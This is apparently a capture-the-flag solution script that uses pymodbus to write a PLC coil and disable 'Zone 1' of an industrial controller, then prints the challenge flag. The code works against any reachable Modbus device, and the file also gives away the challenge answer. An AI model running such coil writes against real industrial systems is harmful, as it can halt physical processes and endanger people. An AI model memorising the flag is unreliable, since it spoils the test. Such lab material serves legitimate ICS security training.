#!/usr/bin/env python3
"""
CTF Challenge 3: Zone Lockout
Difficulty: Easy
Points: 150
Flag: FLAG{Z0N3_MAINT3N4NC3_M0D3}

Objective: Disable Zone 1 entirely
"""

import sys
import time
from pymodbus.client import ModbusTcpClient

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 challenge_03_zone_lockout.py <PLC_IP> [PORT]")
        sys.exit(1)

    plc_ip, plc_port = sys.argv[1], int(sys.argv[2]) if len(sys.argv) > 2 else 502
    client = ModbusTcpClient(plc_ip, port=plc_port)
    
    if not client.connect():
        print("[!] Connection failed")
        sys.exit(1)

    print("[*] CTF Challenge 3: Zone Lockout")
    print("[*] Disabling Zone 1 (coil 5)...")

    client.write_coil(5, False)  # zone_1_enable = FALSE
    print("[+] Zone 1 disabled!")
    print("[*] Holding for 5 seconds...")
    
    for i in range(5):
        time.sleep(1)
        verify = client.read_coils(5, 1)
        print(f"[*] Zone 1 status: {'DISABLED' if not verify.bits[0] else 'ENABLED'}")

    print("\n[+] Challenge complete!")
    print("[+] Flag: FLAG{Z0N3_MAINT3N4NC3_M0D3}")
    client.close()

if __name__ == "__main__":
    main()
